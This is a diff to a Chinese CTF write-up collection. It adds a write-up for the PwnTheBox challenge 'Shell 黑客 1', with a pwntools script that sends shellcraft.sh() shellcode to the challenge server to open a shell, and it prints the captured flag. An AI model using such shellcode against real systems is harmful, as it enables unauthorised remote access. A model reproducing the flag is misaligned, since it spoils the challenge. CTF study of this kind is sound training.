@@ -2370,7 +2370,7 @@ io.interactive()
 
 ------
 
-### [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)
+### ♥ [b0verfl0w](https://ce.pwnthebox.com/challenges?type=4&id=1642)
 
 先`file ./b0verfl0w `查看文件类型，再`checksec --file=./b0verfl0w `检查一下文件保护情况。
 
@@ -2722,7 +2722,24 @@ io.interactive()
 
 ------
 
+### [Shell 黑客 1](https://ce.pwnthebox.com/challenges?id=1007)
 
+题目没有附件，`nc redirect.do-not-trust.hacking.run 10021`可以输入但是没有回显。结合题目描述：
+
+> 你知道什么是 shellcode 吗？也许这可以帮助你了解更多！
+
+直接`asm(shellcraft.sh())`来执行`system("/bin/sh")`获取靶机`shell`权限。编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10021`，发送`payload`即可得到`PTB{9c4fe944-0fdc-497a-ad2a-05e609bc4a3d}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch = 'amd64', os = 'linux',log_level = 'debug')
+io = remote('redirect.do-not-trust.hacking.run', 10021)
+io.sendline(asm(shellcraft.sh()))
+io.interactive()
+```
+
+------
 
 ## Pwnable.kr
 
